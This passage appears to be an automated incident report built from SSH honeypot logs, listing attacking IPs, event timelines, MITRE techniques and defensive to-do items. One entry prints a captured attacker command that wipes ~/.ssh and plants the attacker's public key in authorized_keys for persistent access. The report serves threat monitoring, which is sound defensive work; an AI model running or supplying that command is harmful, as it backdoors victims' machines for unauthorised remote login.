| `2026-08-24 03:06:13` | `cowrie.client.version` |
| `2026-08-24 03:06:13` | `cowrie.client.kex` |
| `2026-08-24 03:06:14` | `cowrie.login.success` |
| `2026-08-24 03:06:14` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:06:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:06:14` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ce84f96b2e7

| Field | Detail |
|---|---|
| **Source IP** | `122.187.230[.]38` |
| **First Seen** | 2026-08-24 03:07 |
| **Last Seen** | 2026-08-24 03:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:07:26` | `cowrie.session.connect` |
| `2026-08-24 03:07:27` | `cowrie.client.version` |
| `2026-08-24 03:07:27` | `cowrie.client.kex` |
| `2026-08-24 03:07:29` | `cowrie.login.success` |
| `2026-08-24 03:07:30` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.230[.]38` to AbuseIPDB if not already reported
- [ ] Block `122.187.230[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d83c4f84adf

| Field | Detail |
|---|---|
| **Source IP** | `70.89.116[.]5` |
| **First Seen** | 2026-08-24 03:07 |
| **Last Seen** | 2026-08-24 03:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:07:35` | `cowrie.session.connect` |
| `2026-08-24 03:07:35` | `cowrie.client.version` |
| `2026-08-24 03:07:35` | `cowrie.client.kex` |
| `2026-08-24 03:07:37` | `cowrie.login.success` |
| `2026-08-24 03:07:37` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.89.116[.]5` to AbuseIPDB if not already reported
- [ ] Block `70.89.116[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ae874fb08f6

| Field | Detail |
|---|---|
| **Source IP** | `182.95.190[.]150` |
| **First Seen** | 2026-08-24 03:12 |
| **Last Seen** | 2026-08-24 03:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:12:24` | `cowrie.session.connect` |
| `2026-08-24 03:12:25` | `cowrie.client.version` |
| `2026-08-24 03:12:25` | `cowrie.client.kex` |
| `2026-08-24 03:12:27` | `cowrie.login.success` |
| `2026-08-24 03:12:28` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.95.190[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.95.190[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b742f5ae4c2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:15 |
| **Last Seen** | 2026-08-24 03:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:15:36` | `cowrie.session.connect` |
| `2026-08-24 03:15:36` | `cowrie.client.version` |
| `2026-08-24 03:15:36` | `cowrie.client.kex` |
| `2026-08-24 03:15:37` | `cowrie.login.success` |
| `2026-08-24 03:15:37` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:15:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:15:37` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc75a50a2bae

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:15 |
| **Last Seen** | 2026-08-24 03:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:15:39` | `cowrie.session.connect` |
| `2026-08-24 03:15:39` | `cowrie.client.version` |
| `2026-08-24 03:15:40` | `cowrie.client.kex` |
| `2026-08-24 03:15:40` | `cowrie.login.success` |
| `2026-08-24 03:15:41` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:15:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:15:41` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53853ffe963

| Field | Detail |
|---|---|
| **Source IP** | `113.108.88[.]121` |
| **First Seen** | 2026-08-24 03:16 |
| **Last Seen** | 2026-08-24 03:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:16:28` | `cowrie.session.connect` |
| `2026-08-24 03:16:28` | `cowrie.client.version` |
| `2026-08-24 03:16:28` | `cowrie.client.kex` |
| `2026-08-24 03:16:30` | `cowrie.login.success` |
| `2026-08-24 03:16:31` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.88[.]121` to AbuseIPDB if not already reported
- [ ] Block `113.108.88[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-368eab97075d

| Field | Detail |
|---|---|
| **Source IP** | `115.68.133[.]201` |
| **First Seen** | 2026-08-24 03:16 |
| **Last Seen** | 2026-08-24 03:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:16:37` | `cowrie.session.connect` |
| `2026-08-24 03:16:37` | `cowrie.client.version` |
| `2026-08-24 03:16:37` | `cowrie.client.kex` |
| `2026-08-24 03:16:39` | `cowrie.login.success` |
| `2026-08-24 03:16:40` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.68.133[.]201` to AbuseIPDB if not already reported
- [ ] Block `115.68.133[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdab50a19121

| Field | Detail |
|---|---|
| **Source IP** | `117.250.250[.]2` |
| **First Seen** | 2026-08-24 03:16 |
| **Last Seen** | 2026-08-24 03:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:16:41` | `cowrie.session.connect` |
| `2026-08-24 03:16:41` | `cowrie.client.version` |
| `2026-08-24 03:16:41` | `cowrie.client.kex` |
| `2026-08-24 03:16:43` | `cowrie.login.success` |
| `2026-08-24 03:16:44` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.250[.]2` to AbuseIPDB if not already reported
- [ ] Block `117.250.250[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f63f9b25b3b

| Field | Detail |
|---|---|
| **Source IP** | `43.134.165[.]86` |
| **First Seen** | 2026-08-24 03:16 |
| **Last Seen** | 2026-08-24 03:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:16:49` | `cowrie.session.connect` |
| `2026-08-24 03:16:50` | `cowrie.client.version` |
| `2026-08-24 03:16:50` | `cowrie.client.kex` |
| `2026-08-24 03:16:52` | `cowrie.login.success` |
| `2026-08-24 03:16:53` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.165[.]86` to AbuseIPDB if not already reported
- [ ] Block `43.134.165[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7751c23faa22

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]37` |
| **First Seen** | 2026-08-24 03:19 |
| **Last Seen** | 2026-08-24 03:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:19:21` | `cowrie.session.connect` |
| `2026-08-24 03:19:21` | `cowrie.client.version` |
| `2026-08-24 03:19:21` | `cowrie.client.kex` |
| `2026-08-24 03:19:22` | `cowrie.login.success` |
| `2026-08-24 03:19:23` | `cowrie.session.params` |
| `2026-08-24 03:19:23` | `cowrie.command.input` |
| `2026-08-24 03:19:23` | `cowrie.command.failed` |
| `2026-08-24 03:19:23` | `cowrie.log.closed` |
| `2026-08-24 03:19:23` | `cowrie.session.params` |
| `2026-08-24 03:19:23` | `cowrie.command.input` |
| `2026-08-24 03:19:24` | `cowrie.session.file_download` |
| `2026-08-24 03:19:24` | `cowrie.log.closed` |
| `2026-08-24 03:19:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]37` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d42084c136a8

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]37` |
| **First Seen** | 2026-08-24 03:19 |
| **Last Seen** | 2026-08-24 03:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:19:24` | `cowrie.session.connect` |
| `2026-08-24 03:19:24` | `cowrie.client.version` |
| `2026-08-24 03:19:24` | `cowrie.client.kex` |
| `2026-08-24 03:19:25` | `cowrie.login.success` |
| `2026-08-24 03:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]37` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-520a0c8df8c0

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]37` |
| **First Seen** | 2026-08-24 03:19 |
| **Last Seen** | 2026-08-24 03:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:19:25` | `cowrie.session.connect` |
| `2026-08-24 03:19:25` | `cowrie.client.version` |
| `2026-08-24 03:19:25` | `cowrie.client.kex` |
| `2026-08-24 03:19:25` | `cowrie.login.success` |
| `2026-08-24 03:19:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]37` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8715204f15a9

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-24 03:20 |
| **Last Seen** | 2026-08-24 03:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:20:15` | `cowrie.session.connect` |
| `2026-08-24 03:20:15` | `cowrie.client.version` |
| `2026-08-24 03:20:15` | `cowrie.client.kex` |
| `2026-08-24 03:20:16` | `cowrie.login.success` |
| `2026-08-24 03:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb7e1cee3106

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-24 03:20 |
| **Last Seen** | 2026-08-24 03:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:20:15` | `cowrie.session.connect` |
| `2026-08-24 03:20:15` | `cowrie.client.version` |
| `2026-08-24 03:20:15` | `cowrie.client.kex` |
| `2026-08-24 03:20:16` | `cowrie.login.success` |
| `2026-08-24 03:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-647e3d0fbd5e

| Field | Detail |
|---|---|
| **Source IP** | `121.167.110[.]137` |
| **First Seen** | 2026-08-24 03:21 |
| **Last Seen** | 2026-08-24 03:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:21:46` | `cowrie.session.connect` |
| `2026-08-24 03:21:46` | `cowrie.client.version` |
| `2026-08-24 03:21:46` | `cowrie.client.kex` |
| `2026-08-24 03:21:49` | `cowrie.login.success` |
| `2026-08-24 03:21:50` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.167.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `121.167.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-343ad0b9a93e

| Field | Detail |
|---|---|
| **Source IP** | `87.225.108[.]138` |
| **First Seen** | 2026-08-24 03:21 |
| **Last Seen** | 2026-08-24 03:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:21:55` | `cowrie.session.connect` |
| `2026-08-24 03:21:56` | `cowrie.client.version` |
| `2026-08-24 03:21:56` | `cowrie.client.kex` |
| `2026-08-24 03:21:58` | `cowrie.login.success` |
| `2026-08-24 03:21:59` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:22:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.225.108[.]138` to AbuseIPDB if not already reported
- [ ] Block `87.225.108[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5beb252817ff

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:25 |
| **Last Seen** | 2026-08-24 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:25:14` | `cowrie.session.connect` |
| `2026-08-24 03:25:14` | `cowrie.client.version` |
| `2026-08-24 03:25:14` | `cowrie.client.kex` |
| `2026-08-24 03:25:15` | `cowrie.login.success` |
| `2026-08-24 03:25:15` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:25:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:25:15` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf22efecd35

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:25 |
| **Last Seen** | 2026-08-24 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:25:18` | `cowrie.session.connect` |
| `2026-08-24 03:25:18` | `cowrie.client.version` |
| `2026-08-24 03:25:18` | `cowrie.client.kex` |
| `2026-08-24 03:25:19` | `cowrie.login.success` |
| `2026-08-24 03:25:19` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:25:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:25:19` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-112449bea566

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:34 |
| **Last Seen** | 2026-08-24 03:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:34:36` | `cowrie.session.connect` |
| `2026-08-24 03:34:36` | `cowrie.client.version` |
| `2026-08-24 03:34:36` | `cowrie.client.kex` |
| `2026-08-24 03:34:37` | `cowrie.login.success` |
| `2026-08-24 03:34:37` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:34:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:34:38` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-766b603cc26e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:34 |
| **Last Seen** | 2026-08-24 03:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:34:40` | `cowrie.session.connect` |
| `2026-08-24 03:34:40` | `cowrie.client.version` |
| `2026-08-24 03:34:40` | `cowrie.client.kex` |
| `2026-08-24 03:34:41` | `cowrie.login.success` |
| `2026-08-24 03:34:41` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:34:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:34:42` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03d07559712f

| Field | Detail |
|---|---|
| **Source IP** | `217.24.185[.]98` |
| **First Seen** | 2026-08-24 03:37 |
| **Last Seen** | 2026-08-24 03:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:37:32` | `cowrie.session.connect` |
| `2026-08-24 03:37:33` | `cowrie.client.version` |
| `2026-08-24 03:37:33` | `cowrie.client.kex` |
| `2026-08-24 03:37:34` | `cowrie.login.success` |
| `2026-08-24 03:37:35` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.24.185[.]98` to AbuseIPDB if not already reported
- [ ] Block `217.24.185[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428b2437ef0c

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]175` |
| **First Seen** | 2026-08-24 03:40 |
| **Last Seen** | 2026-08-24 03:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:40:34` | `cowrie.session.connect` |
| `2026-08-24 03:40:34` | `cowrie.client.version` |
| `2026-08-24 03:40:34` | `cowrie.client.kex` |
| `2026-08-24 03:40:36` | `cowrie.login.success` |
| `2026-08-24 03:40:37` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]175` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a75cbde725e2

| Field | Detail |
|---|---|
| **Source IP** | `125.20.207[.]154` |
| **First Seen** | 2026-08-24 03:40 |
| **Last Seen** | 2026-08-24 03:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:40:42` | `cowrie.session.connect` |
| `2026-08-24 03:40:43` | `cowrie.client.version` |
| `2026-08-24 03:40:43` | `cowrie.client.kex` |
| `2026-08-24 03:40:45` | `cowrie.login.success` |
| `2026-08-24 03:40:46` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.20.207[.]154` to AbuseIPDB if not already reported
- [ ] Block `125.20.207[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-babc2479fedf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:44 |
| **Last Seen** | 2026-08-24 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:44:09` | `cowrie.session.connect` |
| `2026-08-24 03:44:09` | `cowrie.client.version` |
| `2026-08-24 03:44:09` | `cowrie.client.kex` |
| `2026-08-24 03:44:10` | `cowrie.login.success` |
| `2026-08-24 03:44:10` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:44:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:44:10` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:44:10` | `cowrie.session.closed` |

